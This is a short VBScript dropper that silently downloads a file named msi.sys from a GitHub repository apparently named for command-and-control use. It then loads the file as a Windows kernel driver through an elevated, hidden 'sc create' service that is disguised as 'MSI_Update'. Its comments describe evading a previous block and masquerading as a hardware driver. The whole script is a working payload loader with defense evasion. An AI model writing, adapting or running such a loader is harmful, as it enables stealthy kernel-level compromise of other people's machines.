Set objShell = CreateObject("WScript.Shell")
' Moving to a new path to avoid the "History" block from the previous attempt
driverPath = "C:\Users\Public\msi.sys"
githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/msi.sys"

' 1. Download the MSI driver
cmdDownload = "powershell -NoP -W Hidden -C ""iwr '" & githubURL & "' -OutFile '" & driverPath & "'"""
objShell.Run cmdDownload, 0, True

' 2. Clear old attempts and Load the MSI driver
' We use a unique service name 'MSI_Update' to look like a hardware driver
cmdLoad = "powershell -NoP -W Hidden -C ""Start-Process cmd -ArgumentList '/c sc delete msi_update & sc create msi_update binPath= " & driverPath & " type= kernel && sc start msi_update' -Verb RunAs"""
objShell.Run cmdLoad, 0, False
